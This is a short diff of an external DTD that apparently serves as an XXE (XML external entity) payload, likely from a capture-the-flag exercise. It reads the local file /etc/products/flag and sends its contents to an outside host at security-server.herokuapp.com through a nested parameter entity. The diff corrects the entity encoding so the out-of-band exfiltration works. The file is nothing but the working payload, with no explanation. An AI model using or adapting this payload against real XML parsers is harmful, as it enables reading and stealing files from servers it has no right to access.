@@ -1,3 +1,3 @@
 <!ENTITY % t1 SYSTEM "file:///etc/products/flag">
-<!ENTITY % t2 "<!ENTITY t3 SYSTEM 'http://security-server.herokuapp.com/kekeke/write?%t1;'>">
+<!ENTITY % t2 "<!ENTITY &#37; t3 SYSTEM 'http://security-server.herokuapp.com/kekeke/write?%t1;'>">
 
